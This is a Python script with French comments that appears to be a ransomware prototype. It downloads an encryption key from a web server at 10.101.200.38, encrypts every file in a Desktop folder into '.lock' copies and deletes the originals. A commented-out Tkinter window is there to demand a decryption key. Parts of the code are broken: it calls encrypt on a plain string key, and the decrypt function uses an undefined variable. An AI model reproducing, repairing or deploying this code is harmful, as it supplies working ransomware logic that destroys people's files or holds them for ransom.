import Crypto, sys, os, requests
import tkinter as tk
from cryptography.fernet import Fernet

#Variables
directory = "C:\\Users\\Administrateur\\Desktop\\docchiffres\\"
#original_filename = "C:\\Users\\Administrateur\\Desktop\\docchiffres\\a.txt"
#destination_filename = "C:\\Users\\Administrateur\\Desktop\\docchiffres\\a.lock"
#Key="1a3b4c5e6d7f8g9h0i1j2k3l4m5n6o7p"



#key = Fernet.generate_key()
#
#token = f.encrypt(b"my deep dark secret")
#f.decrypt(token)

#Recuperation de la cle sur mon site web
r = requests.get("http://10.101.200.38/key.php")
key = r.text
#f = Fernet(key)


####fonction de cryptage pour un fichier		
def cryptfile(original_filename, key , destination_filename): 
	line_file= ""
	FILE_O = open(original_filename,"r+")
	FILE_D = open(destination_filename,"w")	
	for line in FILE_O:
		line_file= line_file + line		
	crypt_line=key.encrypt(line_file)		
	FILE_D.writelines(crypt_line)
	FILE_O.close()
	FILE_D.close()	

#fonctionde decryptage pour un fichier
def decryptfile(original_filename, key, destination_filename):
	line_file= ""
	FILE_D = open(destination_filename,"r+")
	FILE_O = open(original_filename,"w")	
	for line in FILE_D:
		line_file= line_file + line				
	decrypt_line=f.decrypt(line_file)			
	FILE_O.writelines(decrypt_line)
	FILE_D.close()
	FILE_O.close() 

#Fenetre pour entrer la clef de dechiffrement
def Verification():
    if keydecrypt.get() == 'key':
        # le mot de passe est bon : on affiche une boite de dialogue puis on ferme la fenetre
        decryptfile(destination_filename, key, original_filename)
        Mafenetre.destroy()
    else:
        # le mot de passe est incorrect : on affiche une boite de dialogue
        showwarning('Resultat','Cle de dechiffrement incorrect.\nVeuillez recommencer !')
        keydecrypt.set('')

#au clic sur un fichier, lancer la fenetre
def on_double_click(event):
	Mafenetre.mainloop()

#main


for files in os.listdir(directory):
	original_filename = directory + str(files)
	destination_filename = directory + str(files) + ".lock"
	cryptfile(original_filename, key, destination_filename)
	os.remove(original_filename)


"""
bind("<Double-Button-1>", on_double_click)
mainloop()

# Creation de la fenetre principale (main window)
Mafenetre = tk.Tk()
Mafenetre.title('Cle de dechiffrement requise')

# Creation d un widget Label (texte 'Mot de passe')
Label1 = Label(Mafenetre, text = 'Cle de dechiffr. ')
Label1.pack(side = LEFT, padx = 15, pady = 15)

# Creation d un widget Entry (champ de saisie)
keydecrypt= StringVar()
Champ = Entry(Mafenetre, textvariable= keydecrypt, show='*', bg ='bisque', fg='maroon')
Champ.focus_set()
Champ.pack(side = LEFT, padx = 5, pady = 5)

# Creation d un widget Button (bouton Valider)
Bouton = Button(Mafenetre, text ='Valider', command = Verification)
Bouton.pack(side = LEFT, padx = 5, pady = 5)
"""